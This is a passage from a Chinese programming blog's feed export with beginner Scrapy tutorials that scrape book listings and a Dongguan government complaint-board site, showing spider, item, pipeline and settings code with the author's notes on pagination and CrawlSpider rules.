concurrent requests performed by Scrapy (default: 16)</span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS = 32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure a delay for requests for the same website (default: 0)</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/settings.html#download-delay</span></span><br><span class="line"><span class="comment"># See also autothrottle settings and docs</span></span><br><span class="line"><span class="comment">#DOWNLOAD_DELAY = 3</span></span><br><span class="line"><span class="comment"># The download delay setting will honor only one of:</span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS_PER_DOMAIN = 16</span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS_PER_IP = 16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable cookies (enabled by default)</span></span><br><span class="line"><span class="comment">#COOKIES_ENABLED = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable Telnet Console (enabled by default)</span></span><br><span class="line"><span class="comment">#TELNETCONSOLE_ENABLED = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Override the default request headers:</span></span><br><span class="line"><span class="comment">#DEFAULT_REQUEST_HEADERS = &#123;</span></span><br><span class="line"><span class="comment">#   &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;Accept-Language&#x27;: &#x27;en&#x27;,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable spider middlewares</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class="line"><span class="comment">#SPIDER_MIDDLEWARES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;book.middlewares.BookSpiderMiddleware&#x27;: 543,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable downloader middlewares</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class="line"><span class="comment">#DOWNLOADER_MIDDLEWARES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;book.middlewares.BookDownloaderMiddleware&#x27;: 543,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable extensions</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/extensions.html</span></span><br><span class="line"><span class="comment">#EXTENSIONS = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;scrapy.extensions.telnet.TelnetConsole&#x27;: None,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure item pipelines</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class="line"><span class="comment">#ITEM_PIPELINES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;book.pipelines.BookPipeline&#x27;: 300,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable and configure the AutoThrottle extension (disabled by default)</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/autothrottle.html</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_ENABLED = True</span></span><br><span class="line"><span class="comment"># The initial download delay</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_START_DELAY = 5</span></span><br><span class="line"><span class="comment"># The maximum download delay to be set in case of high latencies</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_MAX_DELAY = 60</span></span><br><span class="line"><span class="comment"># The average number of requests Scrapy should be sending in parallel to</span></span><br><span class="line"><span class="comment"># each remote server</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0</span></span><br><span class="line"><span class="comment"># Enable showing throttling stats for every response received:</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_DEBUG = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable and configure HTTP caching (disabled by default)</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings</span></span><br><span class="line"><span class="comment">#HTTPCACHE_ENABLED = True</span></span><br><span class="line"><span class="comment">#HTTPCACHE_EXPIRATION_SECS = 0</span></span><br><span class="line"><span class="comment">#HTTPCACHE_DIR = &#x27;httpcache&#x27;</span></span><br><span class="line"><span class="comment">#HTTPCACHE_IGNORE_HTTP_CODES = []</span></span><br><span class="line"><span class="comment">#HTTPCACHE_STORAGE = &#x27;scrapy.extensions.httpcache.FilesystemCacheStorage&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="爬取结果"><a href="#爬取结果" class="headerlink" title="爬取结果"></a>爬取结果</h2><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0gkcucwqj31f60u0qe9.jpg" alt="image.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实践是检验真理的唯一标准。现在越来越觉得这句话是真理。分组的时候，不能<code>.extract()</code>，对分组提取数据时，才使用<code>.extract()</code>或者<code>.extract_first()</code>来提取数据。这个例子，翻页的请求是ajax请求，现有知识水平还做不了翻页之后数据的提取。所以我最终做出的结果是每个子分类只抓取了第一页的数据。这次学习的主要知识是用for循环的嵌套来实现每个字段数据的一一对应。</p>
]]></content>
      <categories>
        <category>python爬虫实例</category>
        <category>scrapy框架爬虫</category>
      </categories>
      <tags>
        <tag>scrapy爬虫实例</tag>
        <tag>爬取苏宁图书的图书信息</tag>
      </tags>
  </entry>
  <entry>
    <title>scrapy爬虫实例之爬取阳光政务网的问题反映模块</title>
    <url>//posts/ZH-CN/Scrapy_Spider_Sunshine.html</url>
    <content><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>爬取<a href="http://wz.sun0769.com/">阳光政务网</a>的问题反映模块。主要练习翻页请求是怎么实现的。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>首先，观察element和html响应，发现element中有tbody标签，但是html响应里面没有tbody标签（<strong>这种情况比较多，所以看到tbody标签要额外小心</strong>）。写xpath一定要以html响应为准！<br>start_url要找对，今天我亲自体验了一把start_url都没有正确设置的情况下改xpath的痛苦之情😭<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbzpumuip1j31f60u0n2p.jpg" alt="image.png"><br>思路：</p>
<ol>
<li>提取当前页面的数据和详情页的url</li>
<li><code>scrapy.Request()</code>发送详情页的请求，提取详情页数据</li>
<li>提取翻页的url，发送翻页请求，循环1-2步</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">yield</span> scrapy.Request(</span><br><span class="line">                item[<span class="string">&quot;href&quot;</span>],</span><br><span class="line">                callback=self.parse_detail,</span><br><span class="line">                meta=&#123;<span class="string">&quot;item&quot;</span>: item&#125;</span><br><span class="line">            )</span><br></pre></td></tr></table></figure>
<p>这部分代码是关键。功能是发送详情页请求，<code>parse_detail</code>是我们新定义的一个用于提取详情页数据的函数。<code>meta</code>用于传递当前的数据到parse_detail函数体，使用的场景是当前提取的是部分数据，需要将这部分的数据传递到callback函数体继续添加新的数据。<br>这个例子中，我们还用到了items模块，定义我们需要提取的数据字段。在爬虫代码中使用这个item时，需import。比如：<br><code>from sun.items import SunItem</code></p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>爬虫代码：wzsun.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> sun.items <span class="keyword">import</span> SunItem</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WzsunSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;wzsun&#x27;</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;sun0769.com&#x27;</span>]</span><br><span class="line">    start_urls = [<span class="string">&#x27;http://wz.sun0769.com/html/top/report.shtml&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        <span class="comment">#1. 提取当前页面的数据和详情页的url</span></span><br><span class="line">        tr_list = response.xpath(<span class="string">&quot;//div[@class=&#x27;newsHead clearfix&#x27;]/table[2]/tr&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> tr <span class="keyword">in</span> tr_list:</span><br><span class="line">            item = SunItem()</span><br><span class="line">            item[<span class="string">&quot;title&quot;</span>] = tr.xpath(<span class="string">&quot;./td[3]/a/@title&quot;</span>).extract_first()</span><br><span class="line">            <span class="comment"># print(item[&quot;title&quot;])</span></span><br><span class="line">            item[<span class="string">&quot;href&quot;</span>] = tr.xpath(<span class="string">&quot;./td[3]/a/@href&quot;</span>).extract_first()</span><br><span class="line">            <span class="comment"># print(item[&quot;href&quot;])</span></span><br><span class="line">            item[<span class="string">&quot;publish_date&quot;</span>] = tr.xpath(<span class="string">&quot;./td[last()]/text()&quot;</span>).extract_first()</span><br><span class="line">            <span class="comment"># print(item[&quot;publish_date&quot;])</span></span><br><span class="line">        <span class="comment">#2. scrapy.Request()发送详情页的请求，提取详情页数据</span></span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(</span><br><span class="line">                item[<span class="string">&quot;href&quot;</span>],</span><br><span class="line">                callback=self.parse_detail,</span><br><span class="line">                meta=&#123;<span class="string">&quot;item&quot;</span>: item&#125;</span><br><span class="line">            )</span><br><span class="line">        <span class="comment">#3. 翻页</span></span><br><span class="line">        next_url = response.xpath(<span class="string">&quot;//div[@class=&#x27;pagination&#x27;]//a[text()=&#x27;&gt;&#x27;]/@href&quot;</span>).extract_first()</span><br><span class="line">        <span class="comment"># print(next_url)</span></span><br><span class="line">        <span class="keyword">if</span> next_url <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(</span><br><span class="line">                next_url,</span><br><span class="line">                callback=self.parse</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_detail</span>(<span class="params">self,response</span>):</span></span><br><span class="line">        item = response.meta[<span class="string">&quot;item&quot;</span>]</span><br><span class="line">        item[<span class="string">&quot;content&quot;</span>] = response.xpath(<span class="string">&quot;//div[@class=&#x27;wzy1&#x27;]/table[2]//td[@class=&#x27;txt16_3&#x27;]/text()&quot;</span>).extract()</span><br><span class="line">        <span class="comment"># print(item[&quot;content&quot;])</span></span><br><span class="line">        item[<span class="string">&quot;content_img&quot;</span>] = response.xpath(<span class="string">&quot;//div[@class=&#x27;wzy1&#x27;]/table[2]//td[@class=&#x27;txt16_3&#x27;]//img/@src&quot;</span>).extract()</span><br><span class="line">        item[<span class="string">&quot;content_img&quot;</span>] = [<span class="string">&quot;http://wz.sun0769.com&quot;</span>+i <span class="keyword">for</span> i <span class="keyword">in</span> item[<span class="string">&quot;content_img&quot;</span>]]</span><br><span class="line">        <span class="comment"># print(item[&quot;content_img&quot;])</span></span><br><span class="line">        <span class="comment"># print(item)</span></span><br><span class="line">        <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure>
<p>items.py：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define here the models for your scraped items</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># See documentation in:</span></span><br><span class="line"><span class="comment"># https://docs.scrapy.org/en/latest/topics/items.html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SunItem</span>(<span class="params">scrapy.Item</span>):</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    title = scrapy.Field()</span><br><span class="line">    publish_date = scrapy.Field()</span><br><span class="line">    href = scrapy.Field()</span><br><span class="line">    content = scrapy.Field()</span><br><span class="line">    content_img = scrapy.Field()</span><br></pre></td></tr></table></figure>
<p>pipelines.py：这里保存数据时，我们对提取的数据做了格式化，将content里面的\xa0和空格做了替换。此处复习了正则表达式的替换功能<code>re.sub</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define your item pipelines here</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Don&#x27;t forget to add your pipeline to the ITEM_PIPELINES setting</span></span><br><span class="line"><span class="comment"># See: https://docs.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SunPipeline</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line">        item[<span class="string">&quot;content&quot;</span>] = self.process_content(item[<span class="string">&quot;content&quot;</span>]) <span class="comment">#将content的数据做格式化</span></span><br><span class="line">        <span class="built_in">print</span>(item)</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_content</span>(<span class="params">self, content</span>):</span></span><br><span class="line">        content = [re.sub(<span class="string">r&quot;\xa0|\s&quot;</span>,<span class="string">&quot;&quot;</span>,i) <span class="keyword">for</span> i <span class="keyword">in</span> content] <span class="comment">#去除\xa0和空格</span></span><br><span class="line">        content = [i <span class="keyword">for</span> i <span class="keyword">in</span> content <span class="keyword">if</span> <span class="built_in">len</span>(i)&gt;<span class="number">0</span>] <span class="comment">#去除列表中的空字符串</span></span><br><span class="line">        <span class="keyword">return</span> content</span><br></pre></td></tr></table></figure>
<p>settings.py：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Scrapy settings for sun project</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For simplicity, this file contains only settings considered important or</span></span><br><span class="line"><span class="comment"># commonly used. You can find more settings consulting the documentation:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/settings.html</span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class="line"></span><br><span class="line">BOT_NAME = <span class="string">&#x27;sun&#x27;</span></span><br><span class="line"></span><br><span class="line">SPIDER_MODULES = [<span class="string">&#x27;sun.spiders&#x27;</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">&#x27;sun.spiders&#x27;</span></span><br><span class="line"></span><br><span class="line">LOG_LEVEL = <span class="string">&#x27;WARNING&#x27;</span></span><br><span class="line"><span class="comment"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span></span><br><span class="line">USER_AGENT = <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Obey robots.txt rules</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure maximum concurrent requests performed by Scrapy (default: 16)</span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS = 32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure a delay for requests for the same website (default: 0)</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/settings.html#download-delay</span></span><br><span class="line"><span class="comment"># See also autothrottle settings and docs</span></span><br><span class="line"><span class="comment">#DOWNLOAD_DELAY = 3</span></span><br><span class="line"><span class="comment"># The download delay setting will honor only one of:</span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS_PER_DOMAIN = 16</span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS_PER_IP = 16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable cookies (enabled by default)</span></span><br><span class="line"><span class="comment">#COOKIES_ENABLED = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable Telnet Console (enabled by default)</span></span><br><span class="line"><span class="comment">#TELNETCONSOLE_ENABLED = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Override the default request headers:</span></span><br><span class="line"><span class="comment">#DEFAULT_REQUEST_HEADERS = &#123;</span></span><br><span class="line"><span class="comment">#   &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;Accept-Language&#x27;: &#x27;en&#x27;,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable spider middlewares</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class="line"><span class="comment">#SPIDER_MIDDLEWARES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;sun.middlewares.SunSpiderMiddleware&#x27;: 543,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable downloader middlewares</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class="line"><span class="comment">#DOWNLOADER_MIDDLEWARES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;sun.middlewares.SunDownloaderMiddleware&#x27;: 543,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable extensions</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/extensions.html</span></span><br><span class="line"><span class="comment">#EXTENSIONS = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;scrapy.extensions.telnet.TelnetConsole&#x27;: None,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure item pipelines</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">   <span class="string">&#x27;sun.pipelines.SunPipeline&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable and configure the AutoThrottle extension (disabled by default)</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/autothrottle.html</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_ENABLED = True</span></span><br><span class="line"><span class="comment"># The initial download delay</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_START_DELAY = 5</span></span><br><span class="line"><span class="comment"># The maximum download delay to be set in case of high latencies</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_MAX_DELAY = 60</span></span><br><span class="line"><span class="comment"># The average number of requests Scrapy should be sending in parallel to</span></span><br><span class="line"><span class="comment"># each remote server</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0</span></span><br><span class="line"><span class="comment"># Enable showing throttling stats for every response received:</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_DEBUG = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable and configure HTTP caching (disabled by default)</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings</span></span><br><span class="line"><span class="comment">#HTTPCACHE_ENABLED = True</span></span><br><span class="line"><span class="comment">#HTTPCACHE_EXPIRATION_SECS = 0</span></span><br><span class="line"><span class="comment">#HTTPCACHE_DIR = &#x27;httpcache&#x27;</span></span><br><span class="line"><span class="comment">#HTTPCACHE_IGNORE_HTTP_CODES = []</span></span><br><span class="line"><span class="comment">#HTTPCACHE_STORAGE = &#x27;scrapy.extensions.httpcache.FilesystemCacheStorage&#x27;</span></span><br></pre></td></tr></table></figure>
<p>在设置文件里，我们开启了<code>USER_AGENT</code>字段，设置了一个UA。</p>
<h2 id="爬取的结果"><a href="#爬取的结果" class="headerlink" title="爬取的结果"></a>爬取的结果</h2><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbzq8qfz06j31f60u0k2j.jpg" alt="image.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>settings.py文件里面的<code>ROBOTSTXT_OBEY = False</code>意思是不遵循robots.txt的爬虫规则。<br>正则表达式中<code>\s</code>表示空格符号。<br>翻页请求是这样实现的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">next_url = response.xpath(<span class="string">&quot;//div[@class=&#x27;pagination&#x27;]//a[text()=&#x27;&gt;&#x27;]/@href&quot;</span>).extract_first()</span><br><span class="line">        <span class="comment"># print(next_url)</span></span><br><span class="line">        <span class="keyword">if</span> next_url <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(</span><br><span class="line">                next_url,</span><br><span class="line">                callback=self.parse</span><br><span class="line">            )</span><br></pre></td></tr></table></figure>
<p>xpath之后一定要记得使用<code>.extract_first()</code>或者<code>.extract()</code>。<br><code>a[text()=&#39;&gt;&#39;</code>表示提取文本内容为<code>&gt;</code>的a标签。</p>
]]></content>
      <categories>
        <category>python爬虫实例</category>
        <category>scrapy框架爬虫</category>
      </categories>
      <tags>
        <tag>scrapy爬虫实例</tag>
        <tag>爬取阳光政务网的问题反映模块</tag>
      </tags>
  </entry>
  <entry>
    <title>scrapy爬虫实例之用crawl spider爬取阳光政务网</title>
    <url>//posts/ZH-CN/Scrapy_Spider_Crawl_Sunshine.html</url>
    <content><![CDATA[<h2 id="爬什么"><a href="#爬什么" class="headerlink" title="爬什么"></a>爬什么</h2><p>还是爬取<a href="http://wz.sun0769.com/">阳光政务网</a>的问题反映模块。主要练习crawl spider的使用方法。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>crawl spider用法的特别之处在于，生成爬虫时，加上参数<code>-t crawl</code>。比如本例使用的语句是<code>scrapy genspider -t crawl ygspider sun0769.com</code><br>关键点就是使用Rule可以自动提取匹配到Rule规则的url，并发送请求，获取响应response。比如这是本例中用的Rule。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rules = (</span><br><span class="line">    Rule(LinkExtractor(allow=<span class="string">r&#x27;/html/question/\d+/\d+\.shtml&#x27;</span>), callback=<span class="string">&#x27;parse_item&#x27;</span>), <span class="comment">#提取列表页的url，并返回响应按照parse_item的方法提取数据</span></span><br><span class="line">    Rule(LinkExtractor(allow=<span class="string">r&#x27;/index.php/question/report\?page=\d+&#x27;</span>), follow=<span class="literal">True</span>), <span class="comment">#循环匹配翻页请求</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>参数解读：</p>
<ul>
<li><code>LinkExtractor</code>指的是链接提取器，是内置的一个函数。</li>
<li><code>allow</code>：这里就写正则表达式，匹配我们需要提取的url链接。</li>
<li><code>callback</code>：这是对响应做处理的函数，这个函数实现数据的提取。</li>
<li><code>follow</code>：设置为True表示会循环匹配该条Rule，直到匹配不上为止。</li>
</ul>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>ygspider.py：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> scrapy.linkextractors <span class="keyword">import</span> LinkExtractor</span><br><span class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> CrawlSpider, Rule</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">YgspiderSpider</span>(<span class="params">CrawlSpider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;ygspider&#x27;</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;sun0769.com&#x27;</span>]</span><br><span class="line">    start_urls = [<span class="string">&#x27;http://wz.sun0769.com/html/top/report.shtml&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    rules = (</span><br><span class="line">        Rule(LinkExtractor(allow=<span class="string">r&#x27;/html/question/\d+/\d+\.shtml&#x27;</span>), callback=<span class="string">&#x27;parse_item&#x27;</span>), <span class="comment">#提取列表页的url，并返回响应按照parse_item的方法提取数据</span></span><br><span class="line">        Rule(LinkExtractor(allow=<span class="string">r&#x27;/index.php/question/report\?page=\d+&#x27;</span>), follow=<span class="literal">True</span>), <span class="comment">#循环匹配翻页请求</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_item</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        item = &#123;&#125;</span><br><span class="line">        item[<span class="string">&quot;title&quot;</span>] = response.xpath(<span class="string">&quot;//div[@class=&#x27;wzy1&#x27;]//span[@class=&#x27;niae2_top&#x27;]/text()&quot;</span>).get()</span><br><span class="line">        item[<span class="string">&quot;content&quot;</span>] = response.xpath(<span class="string">&quot;//div[@class=&#x27;wzy1&#x27;][1]/table[2]/tr[1]/td[1]//text()&quot;</span>).extract()</span><br><span class="line">        item[<span class="string">&quot;content&quot;</span>] = [re.sub(<span class="string">r&quot;\xa0|\s|\r\n&quot;</span>, <span class="string">&quot;&quot;</span>,i) <span class="keyword">for</span> i <span class="keyword">in</span> item[<span class="string">&quot;content&quot;</span>]] <span class="comment">#去除\xa0和空格，美化输出格式</span></span><br><span class="line">        item[<span class="string">&quot;content&quot;</span>] = [i <span class="keyword">for</span> i <span class="keyword">in</span> item[<span class="string">&quot;content&quot;</span>] <span class="keyword">if</span> <span class="built_in">len</span>(item[<span class="string">&quot;content&quot;</span>]) &gt; <span class="number">0</span>] <span class="comment">#去掉空元素</span></span><br><span class="line">        item[<span class="string">&quot;img&quot;</span>] = response.xpath(<span class="string">&quot;//div[@class=&#x27;wzy1&#x27;][1]/table[2]/tr[1]/td[1]//img/@src&quot;</span>).extract()</span><br><span class="line">        item[<span class="string">&quot;img&quot;</span>] = [<span class="string">&quot;http://wz.sun0769.com&quot;</span>+i <span class="keyword">for</span> i <span class="keyword">in</span> item[<span class="string">&quot;img&quot;</span>]] <span class="comment">#补全url地址</span></span><br><span class="line">        <span class="built_in">print</span>(item)</span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure>
<p>settings.py：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Scrapy settings for yg project</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For simplicity, this file contains only settings considered important or</span></span><br><span class="line"><span class="comment"># commonly used. You can find more settings consulting the documentation:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/settings.html</span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class="line"></span><br><span class="line">BOT_NAME = <span class="string">&#x27;yg&#x27;</span></span><br><span class="line"></span><br><span class="line">SPIDER_MODULES = [<span class="string">&#x27;yg.spiders&#x27;</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">&#x27;yg.spiders&#x27;</span></span><br><span class="line"></span><br><span class="line">LOG_LEVEL = <span class="string">&#x27;WARNING&#x27;</span></span><br><span class="line"><span class="comment"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span></span><br><span class="line"><span class="comment">#USER_AGENT = &#x27;yg (+http://www.yourdomain.com)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Obey robots.txt rules</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure maximum concurrent requests performed by Scrapy (default: 16)</span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS = 32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure a delay for requests for the same website (default: 0)</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/settings.html#download-delay</span></span><br><span class="line"><span class="comment"># See also autothrottle settings and docs</span></span><br><span class="line"><span class="comment">#DOWNLOAD_DELAY = 3</span></span><br><span class="line"><span class="comment"># The download delay setting will honor only one of:</span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS_PER_DOMAIN = 16</span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS_PER_IP = 16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable cookies (enabled by default)</span></span><br><span class="line"><span class="comment">#COOKIES_ENABLED = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable Telnet Console (enabled by default)</span></span><br><span class="line"><span 